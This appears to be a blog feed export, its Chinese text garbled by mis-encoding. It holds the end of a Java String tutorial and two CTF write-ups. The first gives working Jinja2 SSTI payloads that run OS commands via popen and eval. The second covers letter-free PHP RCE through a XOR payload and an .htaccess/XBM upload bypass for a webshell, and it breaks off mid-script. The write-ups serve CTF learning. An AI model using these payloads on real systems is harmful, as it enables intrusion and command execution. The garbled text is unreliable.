title="Stringå†…å­˜åˆ†æ"></a>Stringå†…å­˜åˆ†æ</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922153204909.png" alt="image-20220922153204909"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922153526437.png" alt="image-20220922153526437"></p><h2 id="å­—ç¬¦ä¸²çš„æ‹¼æ¥"><a href="#å­—ç¬¦ä¸²çš„æ‹¼æ¥" class="headerlink" title="å­—ç¬¦ä¸²çš„æ‹¼æ¥"></a>å­—ç¬¦ä¸²çš„æ‹¼æ¥</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922172731643.png" alt="image-20220922172731643"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922172901733.png" alt="image-20220922172901733"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922173113725.png" alt="image-20220922173113725"></p><p><strong>jdk7ä»¥åï¼Œè°ƒç”¨internæ–¹æ³•æ—¶ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²å·²ç»å­˜åœ¨äºå¸¸é‡æ± ä¸­ï¼Œåˆ™å°†å¸¸é‡æ± ä¸­çš„å¼•ç”¨ç›´æ¥è¿”å›ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åœ¨å¸¸é‡æ± ä¸­ç”Ÿæˆä¸€ä¸ªå¯¹åŸå­—ç¬¦ä¸²çš„å¼•ç”¨ã€‚</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922173746272.png" alt="image-20220922173746272"></p><h2 id="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸€"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸€" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸€"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸€</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922212123884.png" alt="image-20220922212123884"></p><h2 id="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•äºŒ"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•äºŒ" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•äºŒ"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•äºŒ</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String message = &quot;hello word!&quot;;        //contain åˆ¤æ–­æ˜¯å¦åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²        boolean flag1 = message.contains(&quot;he&quot;);        boolean flag2 = message.contains(&quot;he11&quot;);        System.out.println(&quot;flag1 = &quot; + flag1);        System.out.println(&quot;flag2 = &quot; + flag2);        //indexOf æŸ¥æ‰¾æŒ‡å®šå…ƒç´ ç¬¬ä¸€æ¬¡å‡ºç°å¾—ä¸‹æ ‡ï¼Œä»0å¼€å§‹ ä¸å­˜åœ¨è¿”å›-1        int res1 = message.indexOf(&quot;l&quot;);        int res2 = message.indexOf(&quot;o&quot;);        System.out.println(&quot;res1 = &quot; + res1);        System.out.println(&quot;res2 = &quot; + res2);        //lastIndexOf æŸ¥æ‰¾æŒ‡å®šå…ƒç´ æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½® ä¸å­˜åœ¨è¿”å›-1        int res3 = message.lastIndexOf(&quot;l&quot;);        System.out.println(&quot;res3 = &quot; + res3);        //æˆªå–å­—ç¬¦ä¸²        String s1 = message.substring(6); //ä»ç¬¬å…­ä¸ªå­—ç¬¦å¼€å§‹æˆªå–ï¼ŒåŒ…æ‹¬ç¬¬å…­ä¸ªå­—ç¬¦        System.out.println(&quot;s1 = &quot; + s1);        String s2 = message.substring(0,5); //æˆªå–ç¬¬1ä¸ªé“ç¬¬äº”ä¸ªå­—ç¬¦ï¼Œå·¦é—­å³å¼€        System.out.println(&quot;s2 = &quot; + s2);        //è·å–æŒ‡å®šä½ç½®å­—ç¬¦ä¸²        char c =message.charAt(message.length()-1);        System.out.println(&quot;c = &quot; + c);        //å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºcharæ•°ç»„        char [] chars = message.toCharArray();        System.out.println(Arrays.toString(chars));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922214732176.png" alt="image-20220922214732176"></p><h2 id="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸‰"><a href="#å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸‰" class="headerlink" title="å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸‰"></a>å­—ç¬¦ä¸²å¸¸ç”¨æ–¹æ³•ä¸‰</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922215134780.png" alt="image-20220922215134780"></p><pre><code class="java">public class TestString2 &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        String message = &quot;ä½ å¥½ä¸–ç•Œ&quot;;        byte [] bytes = message.getBytes();        System.out.println(&quot;Arrays.toString(bytes) = &quot; + Arrays.toString(bytes));        byte [] messBytes = message.getBytes(&quot;iso8859-1&quot;); //è¿™æ˜¯ç»Ÿä¸€æ ‡å‡†        System.out.println(Arrays.toString(messBytes));        System.out.println(message.getBytes(&quot;gbk&quot;).length); //å›½æ ‡ ä¸€ä¸ªæ±‰å­—ç­‰äºä¸¤ä¸ªå­—èŠ‚        System.out.println(message.getBytes(&quot;utf-8&quot;).length); //ä¸€ä¸ªæ±‰å­—ç­‰äºä¸‰ä¸ªå­—èŠ‚    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922221107346-16638558691005.png" alt="image-20220922221107346"></p><p><strong>starts withå’Œends withã€æ­£åˆ™è¡¨è¾¾å¼ã€replaceå‡½æ•°ã€splitå‡½æ•°</strong></p><pre><code class="java">public class TestString2 &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        //åˆ¤æ–­ä»¥ä»€ä¹ˆå¼€å¤´å’Œä»¥ä»€ä¹ˆç»“å°¾        String message = &quot;I really want to stat at your house&quot;;        boolean flag1 = message.startsWith(&quot;I&quot;);        System.out.println(&quot;flag1 = &quot; + flag1);        boolean flag2 = message.endsWith(&quot;house&quot;);        System.out.println(&quot;flag2 = &quot; + flag2);        //replaceå‡½æ•°ï¼Œæ›¿æ¢ç¬¬ä¸€ä¸ªå­—ç¬¦        String rpmessage = message.replace(&quot;stat at your house&quot;,&quot;love you&quot;);        System.out.println(&quot;rpmessage = &quot; + rpmessage);        //replaceallå‡½æ•°ï¼Œæ›¿æ¢æ‰€æœ‰å­—ç¬¦,ç¬¬ä¸€ä¸ªå‚æ•°å¯ç”¨æ­£åˆ™è¿›è¡ŒåŒ¹é…        String message2 = &quot;wo wo wo love you&quot;;        String rpmessage2 = message2.replaceAll(&quot;wo&quot;,&quot;I&quot;);        System.out.println(&quot;rpmessage2 = &quot; + rpmessage2);        //splitå‡½æ•°åˆ†å‰²å­—ç¬¦ä¸² å¯ç”¨æ­£åˆ™åŒ¹é…        String s1 = &quot;Fly1to1the1moon&quot;;        String [] strings = s1.split(&quot;1&quot;);        System.out.println(Arrays.toString(strings));        //æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…        /*        []:ä»£è¡¨ä¸€ä¸ªå­—ç¬¦        [a-z]:å°å†™å­—æ¯[a-z]ä»»ä½•ä¸€ä¸ªéƒ½å¯ä»¥        +: ä¸€ä¸ªæˆ–å¤šä¸ª        *: 0ä¸ªæˆ–å¤šä¸ª        [^a]:ä»£è¡¨åŒ¹é…ä¸æ˜¯açš„æ•°æ®        ^ :ä»£è¡¨ä»¥ä»€ä¹ˆå¼€å§‹        $ : ä»£è¡¨ä»¥ä»€ä¹ˆç»“å°¾        \dï¼šä»£è¡¨ä»»æ„ä¸€ä¸ªæ•°å­— 0-9        \w ä»£è¡¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿         */        String s2 = &quot;b&quot;;        boolean matchs = s2.matches(&quot;[^a]&quot;);        System.out.println(&quot;matchs = &quot; + matchs);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922225821274.png" alt="image-20220922225821274"></p><h1 id="day18"><a href="#day18" class="headerlink" title="day18"></a>day18</h1><h2 id="StringBuilderä¸StringBuffer"><a href="#StringBuilderä¸StringBuffer" class="headerlink" title="StringBuilderä¸StringBuffer"></a>StringBuilderä¸StringBuffer</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20221004210916260.png" alt="image-20221004210916260"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20221004211139017.png" alt="image-20221004211139017"></p><h2 id="StringBufferå¸¸ç”¨æ–¹æ³•"><a href="#StringBufferå¸¸ç”¨æ–¹æ³•" class="headerlink" title="StringBufferå¸¸ç”¨æ–¹æ³•"></a>StringBufferå¸¸ç”¨æ–¹æ³•</h2>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
      <link href="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
      <url>/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘ç°æ¼æ´"><a href="#å‘ç°æ¼æ´" class="headerlink" title="å‘ç°æ¼æ´"></a>å‘ç°æ¼æ´</h1><p>è¿™é“é¢˜æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>é¦–å…ˆæŸ¥çœ‹æºä»£ç ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearchçˆ†ç ´ä¸€ä¸‹ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>æœ¬é¢˜æ˜¯flaskç±»é¢˜ç›®ï¼Œctfå¸¸è€ƒç‚¹ä¸è¿‡å°±æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¯æ³¨å…¥å‚æ•°ï¼Œæœ¬åœ°å¹¶æ²¡æœ‰ç»™å‡ºï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å»çˆ†ç ´ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨arjunå·¥å…·è¿›è¡Œçˆ†ç ´ã€‚å·¥å…·é“¾æ¥ï¼š<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">æœ€ç»ˆå¯çˆ†ç ´å‡ºæ¥å‚æ•°nameã€‚</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>æµ‹è¯•äº†ä¸€ä¸‹çš„ç¡®å­˜åœ¨æ¨¡æ¿æ³¨å…¥ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¼æ´çš„åˆ©ç”¨ã€‚</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><h2 id="å·¥å…·tplmap"><a href="#å·¥å…·tplmap" class="headerlink" title="å·¥å…·tplmap"></a>å·¥å…·tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>æˆåŠŸï¼Œå‘ç°ä¸ºJinja2æ¨¡æ¿ï¼Œåœ¨ctfé¢˜ç›®ä¸­ç»å¸¸è€ƒå¯Ÿ</p><p>ç›´æ¥â€“os-shellæ‹¿ä¸‹shellï¼Œè¯»å–flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="æ‰‹å·¥åˆ©ç”¨"><a href="#æ‰‹å·¥åˆ©ç”¨" class="headerlink" title="æ‰‹å·¥åˆ©ç”¨"></a>æ‰‹å·¥åˆ©ç”¨</h2><p>åªä¼šå·¥å…·å½“ç„¶ä¸è¡Œï¼Œæœ‰æ—¶å€™å·¥å…·æ— æ³•æˆåŠŸï¼Œå°±éœ€è¦è‡ªå·±æ‰‹åŠ¨æµ‹è¯•ï¼Œæ‰€ä»¥å¦‚ä½•æ‰‹æ’¸ä¹Ÿæ˜¯éœ€è¦æŒæ¡çš„ã€‚</p><p>å…·ä½“å¯å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼Œä¸œè¥¿å¾ˆå¤šä¸”æ‚ï¼Œå†™ç»™è‡ªå·±çœ‹çš„å¤§ä½¬åˆ«å–·æˆ‘ã€‚</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>é¦–å…ˆç»™å‡ ä¸ªæ¯”è¾ƒé€šç”¨çš„payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p><p>ç„¶åæˆ‘ä»¬å†è®²ä¸€è®²è‡ªå·±å¦‚ä½•æ’¸å‡ºæ¥ä¸€ä¸ªpayloadï¼Œåšæ³•å°±æ˜¯å¯»æ‰¾å¯åˆ©ç”¨çš„ç±»ã€‚</p><p>1ã€æœ‰popen()çš„ç±»</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2ã€æœ‰osæ¨¡å—çš„</p><p>socket._socketobjectï¼ˆä¸€èˆ¬åœ¨71ï¼‰ã€site._Printerç­‰æ¨¡å—</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3ã€æœ‰builtinsçš„ç±»</p><p>__ builtins __ä»£ç æ‰§è¡Œï¼ˆæœ€å¸¸ç”¨çš„æ–¹æ³•ï¼‰</p><p>warnings.catch_warningså«æœ‰,å¸¸ç”¨çš„è¿˜æœ‰email.header._ValueFormatter</p><p>__ builtins __  æ˜¯ä¸€ä¸ªåŒ…å«äº†å¤§é‡å†…ç½®å‡½æ•°çš„ä¸€ä¸ªæ¨¡å—ï¼Œæˆ‘ä»¬å¹³æ—¶ç”¨pythonçš„æ—¶å€™ä¹‹æ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸€äº›å‡½æ•°æ¯”å¦‚absï¼Œmaxï¼Œå°±æ˜¯å› ä¸º__ builtins  __ è¿™ç±»æ¨¡å—åœ¨Pythonå¯åŠ¨æ—¶ä¸ºæˆ‘ä»¬å¯¼å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨dir(__ builtins __ )æ¥æŸ¥çœ‹è°ƒç”¨æ–¹æ³•çš„åˆ—è¡¨ï¼Œç„¶åå¯ä»¥å‘ç°__  builtins __ ä¸‹æœ‰evalï¼Œ__ import __ç­‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¥½äº†ï¼Œæ¥ä¸‹æ¥è¿›è¡Œå®è·µã€‚</p><p>æˆ‘ä»¬æŠŠæ‰€æœ‰å­ç±»åˆ—å‡ºæ¥</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>å¥½å®¶ä¼™å‡ºæ¥äº†å¾ˆå¤šå•Šï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å°±å¥½ï¼Œæˆ‘ä»¬ç”¨pythonè„šæœ¬è·‘ä¸€ä¸‹</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>æˆ‘ä»¬å…ˆæ¥æ‰¾ä¸‹os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>å·²ç»å‡ºæ¥äº†åœ¨132ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ä¸€ä¸ªpayload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å¯ä»¥</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>æˆåŠŸåˆ—å‡ºæ¥äº†æ–‡ä»¶ã€‚</p><p>ç›´æ¥è¯»å–flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p><p>åŒç†ï¼Œå¯ä»¥åˆ©ç”¨çš„ç±»è¿˜æœ‰å¾ˆå¤šå•Šï¼Œ</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>å°±åƒè¿™ä¸ªç±»ä¹Ÿåœ¨é‡Œé¢åŒ…å«ç€ï¼Œæˆ‘ä»¬åŒæ ·å¯ä»¥åˆ©ç”¨å®ƒæ¥è·å–flagã€‚</p><p>æ–¹æ³•æœ‰å¾ˆå¤šï¼Œç†è§£åŸç†å¹¶æŒæ¡å…¶ä¸­å‡ ç§æ–¹æ³•å³å¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¨¡æ¿æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
      <link href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/"/>
      <url>/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</url>
      
        <content type="html"><![CDATA[<p>å‘œå‘œå‘œï¼Œæˆ‘è¿™æ¡æ‡’ç‹—å¥½é•¿æ—¶é—´æ²¡åˆ·é¢˜äº†ï¼Œåé¢çš„æ—¥å­è¦æ¡èµ·æ¥äº†ã€‚</p><p>æºç è´´ä¸Šæ¥ï¼š</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p><p>ä»£ç å…¶å®å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯rceã€‚</p><p>æˆ‘ä»¬å…ˆæ¥å°è¯•ä¸€ä¸‹rceï¼Œå¥½å®¶ä¼™ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿å•Šã€‚</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p><p>ç”±æ­¤åˆ¤æ–­ï¼Œè¿™æ˜¯æ— å­—æ¯æ— æ•°å­—rceï¼Œæœ‰ä¸‰ä¸ªæ€è·¯</p><p>1ã€å¼‚æˆ–</p><p>2ã€å–å</p><p>3ã€è‡ªå¢</p><p>ç”±äºè¿™é‡Œå¯¹å­—ç¬¦çš„é•¿åº¦æœ‰é™åˆ¶</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p><p>æ•…é‡‡ç”¨å¼‚æˆ–ã€‚</p><p>è¿™é‡Œè´´ä¸Šå¤§ç¥çš„è„šæœ¬</p><pre><code class="php">&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>è¿è¡Œå¦‚å›¾</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p><p>ç”±æ­¤æˆ‘ä»¬å¯æ„é€ payloadï¼š</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p><p>æˆåŠŸå‡ºæ¥phpinfoï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p><p>å‘ç°æ‰§è¡Œç³»ç»Ÿçš„å‘½ä»¤å…¨è¢«ç¦ç”¨äº†ï¼Œçœ‹æ¥rceèµ°ä¸é€šäº†ã€‚</p><p>è¿™é‡Œé¡ºå¸¦æä¸€å˜´ï¼Œåœ¨buuçš„ç¯å¢ƒä¸­å­˜åœ¨éé¢„æœŸè§£ï¼Œflagç›´æ¥åœ¨phpinfoé‡Œäº†</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p><p>ä¸è¿‡è¿˜æ˜¯æŒ‰ç…§åšé¢˜çš„å¥—è·¯æ¥å§ï¼ŒçœŸæ­£çš„æ¯”èµ›åº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚</p><p>æ—¢ç„¶rceèµ°ä¸é€šï¼Œé‚£å°±è¯•ä¸€è¯•æ–‡ä»¶ä¸Šä¼ å§</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p><p>å„ç§é™åˆ¶éå¸¸å¤šï¼Œè¿™é‡Œé™åˆ¶äº†ä¸Šä¼ phpåç¼€çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡ï¼Œæœ€å…ˆæƒ³åˆ°çš„å°±ç®—.htaccessè§£æã€‚</p><p>ä½†æ˜¯ä¸Šä¼ .htaccessä»ç„¶æœ‰<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p><p>è¿™ä¸ªå‡½æ•°é™åˆ¶ã€‚</p><p>è§£å†³è¿™ä¸ªå‡½æ•°ï¼Œé‡‡ç”¨xbmæ ¼å¼ï¼ŒX Bit Map</p><pre><code>åœ¨è®¡ç®—æœºå›¾å½¢å­¦ä¸­ï¼ŒX Windowç³»ç»Ÿä½¿ç”¨X BitMapï¼ˆXBMï¼‰ï¼Œä¸€ç§çº¯æ–‡æœ¬äºŒè¿›åˆ¶å›¾åƒæ ¼å¼ï¼Œç”¨äºå­˜å‚¨X GUIä¸­ä½¿ç”¨çš„å…‰æ ‡å’Œå›¾æ ‡ä½å›¾XBMæ•°æ®ç”±ä¸€ç³»åˆ—åŒ…å«å•è‰²åƒç´ æ•°æ®çš„é™æ€æ— ç¬¦å·å­—ç¬¦æ•°ç»„ç»„æˆã€‚å½“æ ¼å¼è¢«æ™®éä½¿ç”¨æ—¶ï¼ŒXBMé€šå¸¸å‡ºç°åœ¨æ ‡é¢˜ï¼ˆ.hæ–‡ä»¶ï¼‰ä¸­ï¼Œæ¯ä¸ªå›¾åƒåœ¨æ ‡é¢˜ä¸­å­˜å‚¨ä¸€ä¸ªæ•°ç»„ã€‚ä»¥ä¸‹Cä»£ç ç¤ºä¾‹äº†ä¸€ä¸ªXBMæ–‡ä»¶ï¼š</code></pre><pre><code>#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</code></pre><p>åœ¨è¿™ä¸ªcæ–‡ä»¶ä¸­é«˜å’Œå®½éƒ½æ˜¯æœ‰#åœ¨å‰é¢çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å³ä½¿æŠŠå®ƒæ”¾åœ¨.htaccessæ–‡ä»¶ä¸­ä¹Ÿä¸ä¼šå½±å“.htaccessçš„å®é™…è¿è¡Œæ•ˆæœã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨.htaccessé‡ŒåŠ ä¸Š</p><pre><code>#define width 1337#define height 1337..........</code></pre><p>å°±å¯ä»¥ç»•è¿‡ç»•è¿‡è¿™ä¸ªå‡½æ•°äº†ã€‚</p><p>ä¸Šä¼ .htaccessæ–‡ä»¶åï¼Œè¦ä¸Šä¼ ä¸€ä¸ªéphpåç¼€çš„ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æœ¬é¢˜ä¸­ä»ç„¶å¯¹&lt;?è¿›è¡Œäº†æ£€æµ‹ã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ã€‚</p><p>1ã€å¯¹ä¸€å¥è¯æœ¨é©¬çš„å†…å®¹è¿›è¡Œbase64ç¼–ç ã€‚</p><p>2ã€ä½¿ç”¨ utf-16be æ¥ç»•è¿‡</p><p>ä¸‹é¢å…ˆé™„ä¸Šä¸¤ç§æ–¹æ³•çš„expï¼š</p><p>1ã€</p><pre><code class="python">import requestsimport 